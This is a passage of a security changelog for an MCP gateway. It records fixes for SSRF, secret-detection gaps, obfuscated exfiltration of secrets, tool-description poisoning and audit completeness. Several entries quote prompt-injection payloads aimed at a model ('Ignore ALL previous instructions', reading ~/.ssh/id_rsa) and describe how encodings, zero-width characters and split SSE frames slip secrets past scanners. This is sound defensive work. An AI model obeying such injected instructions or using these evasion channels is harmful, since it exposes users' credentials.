    (org from auth ctx, server_slug=ext:<host>, fire-and-forget, no-op without org) at the enforcement
    points — SSRF block (block/ssrf_blocked), credential-in-args block (block/credential_blocked_inbound),
    result block (block/pii_blocked_outbound), result redact (redact/pii_redacted_outbound). +4 tests.
    Gate: 49 ext + 1252 gateway passed, 0 failed. Additive (no behaviour change). RESIDUAL: allow path +
    infra-error withholds (non-200/non-JSON, response-too-large) not yet audited. Evidence
    mcp-parallel/findings/backstop-p9-ext-proxy-audit/.
  - CHG-0069 (2026-07-02) — G3 item 10 (resource-limits/mem containment), MEDIUM; error-path counterpart of
    CHG-0066: the sandbox agent's streamable-http handler read an upstream error (status>=400) as
    `body = (await response.aread())[:500]` — aread() buffers the WHOLE untrusted error body before the
    slice, so a huge 4xx/5xx body OOMs/restarts that tenant's sandbox. FIX (upstream_manager.py): new async
    _aread_snippet(response, limit=1024) streams aiter_bytes() + stops at limit (never whole-body buffers);
    error read uses it. +2 tests (500→-32000 bounded snippet; _aread_snippet over 1000 chunks/limit=250 →
    ≤250B, ≤3 chunks consumed). Gate: 15 passed (-k "not websocket"; ws tests hang pre-existingly). Contained
    by sandbox 2GiB limit. FOLLOW-UP: _read_json_response (~257-304) dead code has the same whole-body error
    reads. Evidence mcp-parallel/findings/backstop-p10-sandbox-error-body-cap/.
  - CHG-0070 (2026-07-02) — G3 item 9 (audit), MEDIUM (completes CHG-0068): CHG-0068 audited ext_mcp_proxy's
    SSRF/credential/JSON-result block+redact but MISSED (1) the SSE result block (blocked SSE tool result
    egressed no audit while the JSON block did — inconsistent) and (2) any successful tool-call (usage
    unrecorded). FIX (mcp_proxy.py, reusing the _ext_audit helper): audit the SSE result block
    (block/pii_blocked_outbound), the SSE success (allow/ok), and the JSON success (allow/ok in the elif of
    the redact branch — so each call records exactly once: block XOR redact XOR allow). Allow gated on
    _ext_tool_name so protocol overhead (initialize/list) doesn't flood the audit. +2 tests. Gate: 51 ext +
    1256 gateway passed, 0 failed. Additive. RESIDUAL: infra-error withholds (non-200/non-JSON, response-
    too-large) still not audited. Evidence mcp-parallel/findings/backstop-p9-ext-proxy-audit-complete/.
  - CHG-0071 (2026-07-02) — G2 item 2 / 1.4 (provider secret-format detection gap, HIGH; found via an
    adversarial redact_all secret-format sweep): 4 real credential formats egressed UNMASKED and weren't
    flagged by detect_secrets — Anthropic sk-ant-… (OpenAI sk- family was caught but ant wasn't in the
    alternation), SendGrid SG.x.y, GitLab glpat-…, Slack webhook https://hooks.slack.com/services/…. SUBTLE:
    adding to CREDENTIAL_EXPOSURE_PATTERNS masks (redact_all) but does NOT make detect_secrets flag them —
    and the MCP tier1 scan uses detect_secrets to DECIDE enforcement, so a result whose only sensitive
    content is such a key triggers NO redaction and egresses raw. FIX: added all 4 to SECRET_PATTERNS
    (iterated by both detect_secrets + redact_all) + COMPLIANCE_TAG_MAP (SECRET). Near-zero FP (specific
    prefixes). +10 tests. Gate: 10 + 1266 gateway passed, 0 failed. Evidence
    mcp-parallel/findings/backstop-p2-provider-secret-formats/.
  - CHG-0072 (2026-07-02) — G2 item 2 / 1.4 (2nd adversarial secret-format sweep), HIGH: 11 more real
    credential formats egressed UNMASKED — AWS STS temp key ASIA… (aws_access_key was AKIA-only),
    DigitalOcean dop_v1_, Shopify shp{at,ss,ca,pa}_, Square sq0{atp,csp,idp}-, Databricks dapi, Vault
    hv{s,b}., Figma figd_, Telegram <id>:AA…, PyPI pypi-, Linear lin_api_, Mailgun key-<32hex>. FIX
    (patterns.py): widened aws_access_key (PII_PATTERNS/detect_pii) to (?:AKIA|ASIA); added 10 tokens to
    SECRET_PATTERNS (detect_secrets+redact_all) + COMPLIANCE_TAG_MAP (SECRET). Telegram pattern allows the
    optional `bot` URL prefix so a token in api.telegram.org/bot<token>/ masks too. Near-zero FP. +18 tests.
    Gate: 18 + 1284 gateway passed, 0 failed. Evidence mcp-parallel/findings/backstop-p2-more-provider-secrets/.
  - CHG-0073 (2026-07-02) — G2 item 20 / 1.4 (3rd adversarial sweep — IP-leakage surface), MEDIUM
    (fail-OPEN under redact policy): IP_LEAKAGE_PATTERNS was IPv4-RFC1918-only, so a tool RESULT with
    internal IPv6 (ULA fc00::/7, link-local fe80::/10), cloud-metadata/link-local IPv4 (169.254.169.254
    IMDS → IAM creds; the SSRF target the dial guards CHG-0065/0067 block) or CGNAT (100.64.0.0/10)
    egressed RAW. SUBTLE: `_redact_all_raw` masks infra via a HARDCODED key tuple (not the dict) — so
    adding to the dict alone made detect_ip_leakage FLAG the leak while redact_all left it RAW =
    report-redacted-while-forwarding-raw. FIX (patterns.py, ALL 4 points): added internal_ipv6 +
    link_local_ipv4 to (1) IP_LEAKAGE_PATTERNS→detect, (2) the redact tuple→mask, (3) _INFRA_NETWORK_KEYS→
    encoded-infra parity, (4) COMPLIANCE_TAG_MAP→["INFRA"]. IPv6 anchored on the internal first-hextet
    (MAC/timestamp/hex-blob never match); loopback ::1/127.x intentionally NOT flagged. Linear-time, ~0 FP.
    +21 tests. Gate: 21 + 1305 gateway passed, 0 failed. Independent oracle: aidefence_scan piiFound:false
    on the IMDS URL (a generic scanner is BLIND to infra-leak). Evidence
    mcp-parallel/findings/backstop-p20-internal-ipv6-metadata-leak/.
  - CHG-0074 (2026-07-02) — G2 item 2/20 / 1.4 (devil's-advocate on CHG-0073: were the patterns WIRED into
    the live result-enforcement path?), MEDIUM–HIGH fail-OPEN: tracing _scan_tool_result_floor →
    scan_mcp_payload found (1) the orchestrator DETECTS+TAGS ip_leakage but only REDACTS under
    enforcement=="redact"; under the DEFAULT `tag` posture the E12 result floor (gated on
    _findings_have_secret_or_pii — pii/secret ONLY) never fired for ip_leakage → an internal/metadata IP
    (169.254.169.254), IPv6, CGNAT, hostname AND even pre-existing RFC1918 in a tool RESULT egressed RAW.
    (2) The floor re-scan BLOCKS on an unmaskable survivor (a private file path beside the leak) but all 3
    sites SWALLOWED that block and forwarded raw. FIX (mcp_proxy.py + mcp_scan_orchestrator.py): McpFinding
    gains matched_kinds; new _findings_have_infra_network_leak (network keys only via _INFRA_NETWORK_KEYS —
    file paths stay flag-tier, never force-block a benign code result) OR'd into all 3 floor triggers; all 3
    sites PROPAGATE the floor-block fail-closed. Net: internal-network addrs now MASKED under default posture;
    file-path-only stays raw; network|PII + file-path fails CLOSED. +11 tests (drive the REAL floor). Gate:
    11 + 1316 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p20-ipleak-result-floor/.
  - CHG-0075 (2026-07-02) — G2 item 2 / 1.4 (devil's-advocate on detect_* completeness), HIGH: the MCP
    tier-1 scan (mcp_scan_orchestrator._scan_text_tier1) ran detect_pii/secrets/ip_leakage but NOT
    detect_credential_exposure. CREDENTIAL_EXPOSURE_PATTERNS is a SEPARATE dict (Stripe/Twilio/Azure-storage/
    GCP-SA/DB-connection-string/bearer/jwt/slack/gh-fine-grained-PAT) NOT read by detect_secrets → a
    credential whose ONLY match was a CREDENTIAL_EXPOSURE kind was never DETECTED → egressed RAW on a tool
    RESULT (verified E2E at default `tag`) and passed unblocked in tool ARGS to an untrusted upstream. Same
    wrong-dict class as CHG-0071. PART B: 7 of those keys had NO COMPLIANCE_TAG_MAP entry → never tagged
    SECRET. FIX: (a) _scan_text_tier1 imports+calls detect_credential_exposure, folded into the detect branch
    (kinds/matched_kinds/byte-verify + threat precedence pii>secret/cred>ip_leakage → drives result floor +
    arg force-block); (b) COMPLIANCE_TAG_MAP += the 7 keys → ["SECRET","SOC2"]. Net: Stripe/Twilio/Azure/
    conn-string/GCP-SA in results MASKED+tagged SECRET; same in args force-blocked; benign no-FP. +11 tests.
    Gate: 11 + 1327 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p2-cred-exposure-mcp-scan/.
  - CHG-0076 (2026-07-02) — G2 item 2 / 1.4 (devil's-advocate on chat-vs-MCP scan parity), MEDIUM–HIGH: the
    chat OUTPUT scanner decodes text-encoding variants (_decode_text_encoding_variants, G33/G35) but the MCP
    orchestrator tier-1 (_scan_text_tier1) had NO such check. detect_secrets folds base64/hex, but a SECRET/
    CREDENTIAL/INTERNAL-NETWORK-IP hidden by a TEXT-encoding (HTML char refs &#..;, percent, \u/\x) dodges
    the raw regexes, and redact_all can't mask an encoded run — so an encoded credential/internal IP in a
    tool RESULT egressed (verified) and a markdown/HTML MCP client decodes it back = exfil past the firewall
    by an untrusted upstream (same class in ARGS). FIX (mcp_scan_orchestrator.py): _scan_text_tier1 decodes
    the variants; a decoded SECRET/CREDENTIAL/internal-NETWORK-IP the raw text lacked → BLOCK (fail-closed,
    non-monitor). SCOPED: generic PII EXCLUDED (scraped-HTML contact emails must not false-block web tools);
    file paths excluded. Net: encoded secret/IP in result or args BLOCKS; encoded PII email not blocked; raw
    secret still masked (no regression); benign HTML entities/plain/URL no-FP. +9 tests. Gate: 9 + 1327
    gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p2-mcp-encoded-exfil/.
  - CHG-0077 (2026-07-02) — G2 item 2 / 1.4 (devil's-advocate on tool poisoning), MEDIUM: tool descriptions
    from tools/list come LIVE from the untrusted upstream MCP server + are shown to the model (tool-poisoning
    /line-jumping surface). The EXT proxy scans tools/list (in _EXT_FINITE_RESULT_METHODS) but the ORG
    tools/list handler (org_mcp_jsonrpc) — BOTH the adapter AND backend sub-paths — returned the list after
    only visibility filters, NO content scan → a secret/PII/internal-IP (or CHG-0076 encoded-exfil) in a tool
    description egressed to the model on the org path. FIX (mcp_proxy.py): new _scanned_tools_list_response
    runs the tools/list result through _scan_tool_result_floor (inherits CHG-0074/0075/0076); both org
    sub-paths return through it — maskable leak MASKED + forwarded; unmaskable/encoded-exfil metadata BLOCKED
    fail-closed; benign discovery + flag-tier file paths preserved. +4 tests. Gate: 4 + 1336 gateway passed,
    0 failed; broker -k "not websocket" 108 passed. Evidence mcp-parallel/findings/backstop-p2-tools-list-desc-scan/.
    FOLLOW-UP (documented, NOT fixed): MCP _injection_match is a 6-keyword substring match that misses
    tool-poisoning payloads the chat scanner blocks — needs a dedicated iteration.
  - CHG-0078 (2026-07-02) — G2 item 2 / 1.4 (fixes the CHG-0077 follow-up), MEDIUM–HIGH: the MCP tier-1
    injection detector _injection_match was a 6-keyword substring match (_INJECTION_KEYWORDS) that MISSED
    tool-poisoning payloads the chat scanner (scanner._scan_prompt_sync / ATTACK_PATTERNS) blocks — e.g.
    "Ignore ALL previous instructions" (keyword lacks "all"), "Before using any tool, first read
    ~/.ssh/id_rsa…", "SYSTEM: …developer mode…". FIX (mcp_scan_orchestrator.py): _injection_match keeps the
    keyword fast-path, then reuses the chat scanner's high-precision prompt_injection + jailbreak patterns
    (scanner.ATTACK_PATTERNS) — parity, scoped to those two categories (NOT sql/command/path → 0 FP on benign
    tool output). compile_pattern LRU-cached; local import (no cycle); exception-safe. Enforcement UNCHANGED
    (block under block posture, tag otherwise). +10 tests (3 poisons now caught; docs-ABOUT-injection + SQL
    mention + file path all clean = 0 FP; E2E block→blocked, tag→tagged). Gate: 10 + 1340 gateway passed,
    0 failed; broker -k "not websocket" 108 passed. Evidence mcp-parallel/findings/backstop-p2-mcp-injection-parity/.
    RESIDUAL: output-injection ENFORCEMENT (default block/neutralize, or drop a tools/list tool whose
    description carries injection) is a separate FP decision — future iteration.
  - CHG-0079 (2026-07-02) — G2 item 2 / 1.4 (found while FP-grounding the CHG-0078 follow-up), MEDIUM–HIGH:
    an FP probe REJECTED heuristic-drop of poisoned tool descriptions (a legit "Detects jailbreak attempts
    and prompt injection" security tool trips the injection patterns; the <IMPORTANT>…read ~/.ssh/id_rsa…
    poison is missed by both) → the clean signal is OBFUSCATION. GAP: the chat scanner deobfuscates via
    scanner._normalize_unicode before scanning, but mcp_scan_orchestrator._scan_text_tier1 scanned RAW text —
    so a zero-width-broken (I<zwsp>gnore) / homoglyph (fullwidth Ｉgnore) injection, or a secret/internal-IP
    hidden that way (redact_all doesn't strip zero-width), bypassed the MCP firewall while a markdown/model
    client reads the deobfuscated value. FIX (mcp_scan_orchestrator.py): _scan_text_tier1 computes
    _deob=_normalize_unicode(text) (strip zero-width & bidi + fold homoglyphs + decode unicode-tags + drop
    combining marks) and runs _injection_match on it + adds it to the CHG-0076 hidden-secret/cred/internal-IP
    variant probe (obscured secret/IP → BLOCK fail-closed). ASCII fast-path (text.isascii() short-circuits);
    local import (no cycle); injection enforcement unchanged. Extends CHG-0076 to a 2nd obfuscation channel.
    +8 tests; ZERO FP (emoji ZWJ 👨‍👩‍👧 + Japanese + accents + ASCII all clean — detection-only probe). Gate:
    8 + 1350 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p2-mcp-unicode-deobfuscation/.
  - CHG-0080 (2026-07-02) — G2 item 2 / 1.4 (devil's-advocate on model-facing surfaces), MEDIUM: the MCP
    `initialize` result carries an `instructions` field the spec treats as model-facing guidance ("analogous
    to a system prompt") + serverInfo — a tool-poisoning/injection + metadata surface like tool descriptions
    (CHG-0077). ORG path is SAFE (org_mcp_jsonrpc SYNTHESIZES initialize; no upstream instructions
    forwarded), but the EXT transparent proxy (ext_mcp_proxy) scans a result only when the method is in
    _EXT_FINITE_RESULT_METHODS — and `initialize` was NOT in it → the upstream's initialize instructions/
    serverInfo egressed RAW to the model. FIX (mcp_proxy.py): added "initialize" to
    _EXT_FINITE_RESULT_METHODS → the finite handshake result now routes through the result floor (inherits
    CHG-0074/0075/0076/0079 + injection detect/tag). initialize ARGS not scanned (client-provided). +5 tests
    (secret+IP in instructions masked+tagged; zero-width-hidden secret blocked; injection detected; benign
    intact). Gate: 5 + 1358 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p2-ext-initialize-instructions/.
  - CHG-0081 (2026-07-02) — G2 item 5/9 / 1.4 (devil's-advocate on the …→tag→AUDIT chain end), MEDIUM
    audit-completeness: CHG-0077's _scanned_tools_list_response masks/blocks a poisoned tool-description leak
    but had ZERO _record_gateway_event calls (tools/call audits heavily) → a tool-poisoning BLOCK or a
    secret/PII/IP REDACT on the discovery path was INVISIBLE to the MCPEvent audit/SIEM trail. FIX
    (mcp_proxy.py): _scanned_tools_list_response now audits block XOR redact (tool_name=tools/list,
    reason=tools_list_metadata_scan, compliance tags, findings, + a threaded per-request correlation id via a
    new request_id param = _mcp_request_correlation_id from both org sub-paths); a clean tools/list is NOT
    audited (no noise). +3 tests. Gate: 3 + 1363 gateway passed, 0 failed; broker -k "not websocket" 108
    passed. Evidence mcp-parallel/findings/backstop-p9-tools-list-audit/.
  - CHG-0082 (2026-07-02) — G2 item 5/9 / 1.4 (bare-REST parity, applying the CHG-0081 audit + CHG-0077 scan
    lens to the other REST routes), MEDIUM: (A) org_mcp_tool_call (REST POST .../tools/call) audited a result
    BLOCK but swapped a REDACTED result in SILENTLY (no _record_gateway_event) → a secret/PII/IP masked on
    the primary bare-REST tool-call path was invisible to audit (asymmetric with the block branch + org
    jsonrpc). (B) org_mcp_tools_list (REST GET .../tools) FILTERED but NEVER scanned tool descriptions (JSON-
    RPC tools/list already scans, CHG-0077) → a secret/PII/IP or tool-poisoning payload in a description
    egressed on this REST endpoint. FIX (mcp_proxy.py): (A) audit decision=redact before swapping the masked
    result; (B) run the REST tools-list through _scan_tool_result_floor (mask/block unmaskable→403) + audit
    block/redact; clean list not audited. Reuses the floor chain (CHG-0074/0075/0076/0079). +3 tests. Gate: 3
    + 1369 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p9-bare-rest-parity/.
  - CHG-0083 (2026-07-02) — G2 item 2 / 1.4 (found by a category×obfuscation regression-matrix pre-flight),
    HIGH: several CREDENTIALS live in PII_PATTERNS (detect_pii, NOT detect_secrets) — aws_access_key
    (AKIA/ASIA), aws_secret_access_key, api_key_openai, github_token, private_key_header. The CHG-0076
    (text-encoding) + CHG-0079 (invisible-unicode) encoded-exfil BLOCK only ran detect_secrets/cred/ip, so an
    OBFUSCATED AWS/GitHub/OpenAI key (HTML-entity/zero-width) slipped past the block while its raw form masks
    (a model client reads it deobfuscated). FIX (mcp_scan_orchestrator.py): the encoded _hidden probe now
    also includes decoded detect_pii matches whose compliance tag is SECRET (credentials misfiled as PII);
    generic PII (email/phone/ssn/cc → never SECRET) stays EXCLUDED (scraped-HTML FP guard). +27 tests (incl. a
    durable adversarial matrix). Gate: 27 + 1369 gateway passed, 0 failed; broker -k "not websocket" 108
    passed. Evidence mcp-parallel/findings/backstop-p2-obfuscated-cred-in-pii/. RESIDUAL: aws_access_key etc.
    really belong in SECRET_PATTERNS (future cleanup); obfuscated SSN/CC still not blocked by the encoded path
    (raw masks).
  - CHG-0084 (2026-07-02) — ARCH item 11 (Redis correctness) / soak item 16 (found by a Redis-correctness
    sweep applying the CHG-0062 lens), MEDIUM: leakage_detector.py LeakageDetector.track_cross_request tracked
    cross-request fragment hashes in a Redis SET (leakage:cross:{key}) but did per-fragment await sadd then a
    SEPARATE await expire → a cancellation (client disconnect under load) or transient error between them
    ORPHANED the SET with NO TTL → unbounded Redis growth under soak (same class as CHG-0062). FIX
    (leakage_detector.py): one MULTI/EXEC (pipeline transaction=True) sets members + window TTL atomically
    (also 1 round-trip not N+1); sliding-window preserved; fail-safe unchanged. +3 tests. Gate: 3 + 1421
    gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p11-leakage-detector-ttl-leak/. RESIDUAL: circuit_breaker.py uses
    transaction=False pipelines for INCR+EXPIRE (batched, small orphan window) — lower priority.
  - CHG-0085 (2026-07-02) — ARCH credential-at-rest (found by a security review of the MCP OAuth proxy),
    HIGH: mcp_oauth_proxy._write_mcp_remote_tokens persists mcp-remote token files under /tmp/mcp-orgs/{org}/
    mcp-auth/... — access_token + refresh_token, client_secret, PKCE code_verifier — via Path.write_text +
    mkdir(exist_ok=True) with DEFAULT perms (verified on-host: 0664 world-readable files, 0775
    world-traversable dirs). So a co-located process/tenant on the shared gateway host could read another
    org's OAuth creds at rest → upstream-MCP account takeover (Redis copies were already encrypted per
    CHG-0042; the on-disk copies were not). FIX (mcp_oauth_proxy.py): new _write_secure_text creates files
    via os.open(O_CREAT, 0o600) (restrictive mode at creation, umask-proof) + re-chmod; _write_mcp_remote_
    tokens chmods the org tree (/tmp/mcp-orgs/{org}, mcp-auth, each mcp-remote-{ver}) to 0700. Content
    unchanged. +2 tests (all dirs 0700 + files 0600; os.walk finds ZERO group/world paths; secrets intact).
    Gate: 2 + 1449 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p12-oauth-token-file-perms/. RESIDUAL: ideally write inside the per-tenant
    sandbox FS (item 12); shred on revocation.
  - CHG-0086 (2026-07-02) — ARCH item 11 (Redis correctness; closes the CHG-0084 residual), LOW–MEDIUM:
    circuit_breaker.py used pipeline(transaction=False) at 4 INCR/DELETE+EXPIRE sites (record_success,
    record_error, _bump_epoch, _admit_probe — the last's docstring even claims "Atomically claim a probe
    slot"). A mid-pipeline connection drop could orphan a counter with NO TTL (same class as CHG-0062/0084).
    FIX (circuit_breaker.py): all 4 → pipeline(transaction=True) (MULTI/EXEC), so INCR + EXPIRE commit
    atomically; execute() still returns results (24 breaker tests green). Completes the Redis-atomicity
    trilogy (CHG-0062 rate-limit / CHG-0084 leakage-detector / CHG-0086 circuit-breaker); no remaining
    non-atomic TTL-setter found. +1 test. Gate: 1 + 1454 gateway passed, 0 failed; broker -k "not websocket"
    108 passed. Evidence mcp-parallel/findings/backstop-p11-circuit-breaker-atomicity/.
  - CHG-0087 (2026-07-02) — ARCH item 13 (Phase-3 monitoring/metrics), MEDIUM: the gateway has a Prometheus
    layer (metrics.py, /metrics) but there was NO MCP metric and mcp_proxy called `metrics` NOWHERE — every
    MCP scan decision (block/redact/allow/monitor) was AUDITED (MCPEvent) but never METERED, so the 1.4
    guardrails were invisible to dashboards/alerting. FIX (metrics.py + mcp_proxy.py): two low-cardinality
    counters amf_gateway_mcp_scan_decisions_total{org,decision} + amf_gateway_mcp_compliance_tags_total
    {org,tag} + record_mcp_scan_decision() (fail-safe, _safe_label-bounded), wired into _record_gateway_event
    (best-effort try/except so metrics never break the request path). +4 tests. Gate: 4 + 1455 gateway
    passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p13-mcp-scan-metrics/. RESIDUAL: MCP latency histogram + OTel tracing are
    future item-13 pieces.
  - CHG-0088 (2026-07-02) — ARCH item 13/20 (monitoring; completes CHG-0087 residual), LOW–MEDIUM: CHG-0087
    added MCP scan-decision + tag COUNTERS but no latency metric, though _record_gateway_event already carries
    latency_ms — so MCP p50/p95/p99 (what "1.4 under peak load" needs) weren't exposed to Prometheus. FIX
    (metrics.py + mcp_proxy.py): new amf_gateway_mcp_call_seconds{org,decision} Histogram (5ms…10s);
    record_mcp_scan_decision gains latency_ms and observes latency_ms/1000 ONLY when truthy (0/None skipped so
    untimed paths don't skew the low bucket); wired via _record_gateway_event (still fail-safe try/except).
    +2 tests. Gate: 6 + 1461 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p13-mcp-latency-histogram/. RESIDUAL: OTel tracing for the per-call chain
    remains a separate item-13 piece.
  - CHG-0089 (2026-07-02) — ARCH item 13/20 (monitoring), MEDIUM: metrics.record_rate_limit is called ONLY
    from the chat handler (main.py, per-MODEL limiter). The per-ORG TPM/burst/RPM limiter
    (_enforce_org_tpm_rate_limit/_enforce_org_burst_rpm) doesn't meter internally, and the MCP path
    (_mcp_org_rate_limit_raw) returned a plain 429 with NO metric — so MCP throttling under load (5k–10k
    concurrent calls) was invisible to Prometheus. FIX (mcp_proxy.py): _mcp_org_rate_limit_raw, on a 429 (TPM
    or burst/RPM), calls record_mcp_scan_decision(org, "rate_limited") → lands in
    amf_gateway_mcp_scan_decisions_total; preserves the TPM→burst short-circuit + allow path; fail-safe. +4
    tests. Gate: 4 + 14 rate-limit + 1501 gateway passed, 0 failed; broker -k "not websocket" 108 passed.
    Evidence mcp-parallel/findings/backstop-p13-mcp-ratelimit-metric/. RESIDUAL: metering
    _enforce_org_tpm_rate_limit internally (chat + MCP) would be cleaner.
  - CHG-0090 (2026-07-02) — 1.4 / item-20 concurrency dimension (verification + regression-lock, ZERO
    defects): the 300–500-sandbox stress SCALE is host-blocked, but the 1.4 guardrails' concurrency-SAFETY is
    provable here — the scan/redact chain (_scan_tool_result_floor → orchestrator → redact_all) runs against
    MODULE-LEVEL state (compiled-pattern LRU, enabled-tools/server-config caches); a race could
    cross-contaminate concurrent scans (one request's secret leaking into another's result). NEW TEST
    (test_mcp_scan_concurrency_safety.py): 300 concurrent scans each w/ a UNIQUE canary secret+PII+IP across
    10 orgs → 0 own-canary leaks + 0 cross-contamination; + 100 benign concurrent unchanged. Durable
    regression backstop against a future edit adding shared mutable state to the hot scan path. Gate: 2 +
    1527 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence
    mcp-parallel/findings/backstop-p20-1.4-concurrency-safety/. HONESTY: proves concurrency-safety, NOT the
    full 300–500-sandbox live stress (host-blocked, owned by CP47-50).
    NOTE (this iter, verification-only, no change): CROSS-TENANT isolation solid — all MCP caches keyed
    {org}/{server}, OAuth tokens {org}|{url}, tool-call cap {key_id} (org-bound), rate-limit {org}-scoped;
    no non-org-scoped cache holds tenant data. (Backs the cross-tenant-canary requirement.)
  - CHG-0091 (2026-07-03) — HIGH fail-open 1.4 leak on the stdio/websocket ADAPTER tools/call path
    (mcp_proxy.py org_mcp_jsonrpc): a BARE JSON-RPC ERROR envelope ({"jsonrpc","id","error":{…}}, NO
    "result" key — the standard response an MCP upstream returns on tool FAILURE) with a secret/PII/internal-
    IP in error.message was scanned whole (`_scan_target = payload.get("result") if "result" in payload else
    payload`) and DETECTED, but all 3 output swap branches were gated on `"result" in payload` → for an error
    envelope the redaction was computed then DISCARDED and the RAW error egressed. Under the default "tag"
    posture the FLOOR is the operative masker and its gate was exactly the one excluding error envelopes.
    FIX: dropped the `"result" in payload` guard from the floor condition + both redact-swap branches now
    write back to the WHOLE envelope when there is no "result" key (also keep audited `reason` in sync with
    the masked message). Now a secret/PII/IP in a bare error egress is MASKED (or fail-CLOSED blocked on an
    unmaskable survivor). streamable-http path was already correct (swaps unconditionally). NEW TEST
    test_mcp_adapter_error_envelope_redaction.py (5): redacted-under-tag / benign-unchanged / flag-off-raw /
    monitor-wins / unmaskable→[BLOCKED]. Gate: 5 + 1534 gateway passed 0 failed; broker 108. Byte-truth:
    fixed egress `[CONNECTION_STRING_REDACTED]`, flag-off egress still `ghp_…@10.0.0.5`. Independent oracle
    (aidefence, decoupled from patterns.py): email/SSN error envelope → has_pii false fixed / true raw.
    Evidence mcp-parallel/findings/backstop-p-adapter-error-envelope/. RESIDUAL: tools/LIST adapter
    fall-through (~L2943 raw return on non-tools-shaped payload) is the same class, far lower probability —
    noted, not fixed (scope). → CLOSED by CHG-0092.
  - CHG-0092 (2026-07-03) — MEDIUM fail-open 1.4 leak, the CHG-0091 TWIN closing the class: MCP adapter
    tools/LIST fall-through (mcp_proxy.py org_mcp_jsonrpc, the `return adapter_resp` after the tools-shaped
    branch). Upstream tool descriptions were scanned only for tools-shaped payloads (_scanned_tools_list_
    response, CHG-0077/0081); any NON-tools-shaped payload — a bare JSON-RPC error envelope (auth-failure
    tools/list errors can echo a token/URL/PII), or a malformed result — returned RAW unscanned. FIX: before
    the fall-through, scan the whole payload via _scan_tool_result_floor (same floor as CHG-0091), mirroring
    the _scanned_tools_list_response contract — masked→redacted envelope, unmaskable→fail-CLOSED withheld,
    clean→raw passthrough; audit block/redact (reason="tools_list_error_scan"). +3 tools/list tests (secret+IP
    masked / benign unchanged / tools-shaped still scanned). Gate: 8 + 1538 gateway passed 0 failed; broker
    108. Byte-truth: tools/list error egress b***@c***.example / ***-**-4321 (raw bob.jones@corp.example /
    987-65-4321); AWS-key+IP variant both masked. Independent oracle (aidefence): has_pii false fixed / true
    raw. Evidence mcp-parallel/findings/backstop-p-toolslist-error-envelope/. NOTE: a ghp_… looked unmasked →
    was a test-token defect (pattern \bghp_[a-zA-Z0-9]{36}\b, exactly 36; valid 36-char github token IS masked
    via detect_pii→floor), not a code gap; tests use AKIAIOSFODNN7EXAMPLE.
  - CHG-0093 (2026-07-03) — HIGH fail-open 1.4 leak: SSE multi-line data: split evades the MCP tool-result
    scanner (mcp_proxy.py _scan_reframe_sse_tool_result). Per the SSE spec an event's data is the concat of
    ALL its data: values joined by "\n"; the reframer parsed EACH data: line as standalone JSON, so an
    untrusted upstream could split a JSON-RPC result across data: lines at a STRUCTURAL point (JSON whitespace
    between tokens) — each fragment invalid JSON alone (fell through to "not JSON -> verbatim"), yet a
    spec-compliant client reassembles them into the COMPLETE valid result -> secret egressed raw. FIX: parse
    the buffered SSE PER EVENT, reassemble each event's data: values with "\n" BEFORE json-parse + scan via
    _scan_tool_result_floor; redact -> re-emit non-data lines verbatim + one masked data: line; unmaskable ->
    fail-CLOSED withhold; clean/keep-alive/non-JSON -> verbatim. Covers result+error frames. NEW TEST
    test_mcp_sse_multiline_split.py (7). Gate: 7 + 1540 gateway passed 0 failed; broker 108. Byte-truth
    (client-reassembled): fixed c***@c***.example / ***-**-7788 (raw carol.roe@corp.example / 555-66-7788);
    AKIAIOSFODNN7EXAMPLE+IP variant masked. Independent oracle (aidefence): has_pii false fixed / true raw.
    Evidence mcp-parallel/findings/backstop-p-sse-multiline-split/. Note: E14 streaming-split tests cover the
    CHAT SecureStreamingResponse guard, a DIFFERENT mechanism — this MCP SSE reframer gap was uncovered.
  - CHG-0094 (2026-07-03) — MEDIUM audit-completeness gap: MCP audit backpressure (_spawn_audit_event,
    mcp_proxy.py) dropped SECURITY-decision records under load. The inflight cap (_AUDIT_MAX_INFLIGHT=64) shed
    audits INDISCRIMINATELY, so under 5k–10k concurrent calls + slow control the 64 slots fill and block/redact/
    rate_limited/error audits drop too — an attack producing many blocks drops the very block audits it created,
    breaking the …→tag→AUDIT chain silently (only a LOG.warning). FIX: priority-aware shedding — security
    decisions get a higher ceiling (_AUDIT_MAX_INFLIGHT_HIGH=256, env-overridable) so allow/monitor/clean shed
    first and security audits survive; shared counter still bounds total inflight to 256. + new metric
    amf_gateway_mcp_audit_dropped_total{priority,decision} (metrics.record_mcp_audit_dropped) — non-zero
    priority=high = a lost security audit, alertable. _spawn_audit_event reads payload["decision"] (no caller
    change). NEW TEST test_mcp_audit_backpressure_priority.py (5). Gate: 5 + 1552 gateway passed 0 failed;
    broker 108. Evidence mcp-parallel/findings/backstop-p-audit-backpressure-priority/. (Observability/audit
    fix — no content leak, so no aidefence oracle; proof is the shed-decision + drop-metric behavior test.)
  - CHG-0095 (2026-07-03) — MEDIUM audit-completeness gap: ext-proxy (ext_mcp_proxy, mcp_proxy.py) infra-error
    WITHHOLD/redact decisions were NOT audited. It audits SSRF/credential/PII blocks (CHG-0068/0070) but the
    fail-closed infra paths recorded nothing → invisible in the MCPEvent trail: response-too-large withhold
    (SSE+non-SSE, CHG-0064), non-JSON body withhold+redact, JSON-RPC error-content withhold+redact, non-200
    body withhold+redact (CHG-0061), request-too-large DoS reject. This is the residual CHG-0068/0070 left
    open. FIX: added _ext_audit(...) at every silent site (fire-and-forget, no-op unauth) with stable reasons
    (response_too_large / text_body_withheld+redacted / error_content_withheld+redacted / nonok_body_withheld+
    redacted / request_too_large), carrying tool+tags+findings. Purely additive (bodies unchanged). NEW TEST
    test_mcp_ext_withhold_audit.py (5, assert _record_gateway_event fired with the right decision/reason). Gate:
